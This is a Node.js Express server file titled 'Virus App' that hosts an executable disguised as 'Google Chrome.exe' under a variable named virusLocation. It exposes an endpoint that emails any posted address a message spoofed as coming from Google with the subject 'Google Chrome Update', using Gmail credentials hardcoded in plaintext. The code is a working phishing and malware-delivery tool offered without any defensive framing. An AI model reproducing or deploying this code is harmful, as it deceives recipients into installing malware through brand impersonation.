const express = require('express');
const app = express();
const nodemailer = require('nodemailer');
const bodyParser =  require('body-parser');
const template = require('./utils/template');

//Middlewares
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.send(`<h1>Virus App<h1>`);
});

app.get('/download', (req, res) => {
    const virusLocation = './uploads/Google Chrome.exe';
    res.download(virusLocation, 'Google Chrome.exe');
});

app.post('/sendEmail', (req, res) => {

    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'pruebas.email.elio@gmail.com', // generated ethereal user
            pass: 'pruebas123' // generated ethereal password
        }
    });

    // setup email data with unicode symbols
    let mailOptions = {
        from: '"Google" <google@gmail.com>', // sender address
        to: req.body.email, // list of receivers
        subject: 'Google Chrome Update', // Subject line
        html: template.prepareTemplate(req.body.name)// html body
    };

    // send mail with defined transport object
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            res.status(400).send({
                errorDescription: error
            });
            return console.log(error);
        }
        console.log('Message sent: %s', info.messageId);
        res.status(200).send({
            info: info.messageId
        });
    });

})

app.listen(8000, () => {
    console.log(`application is running at: http://localhost:8000`);    
});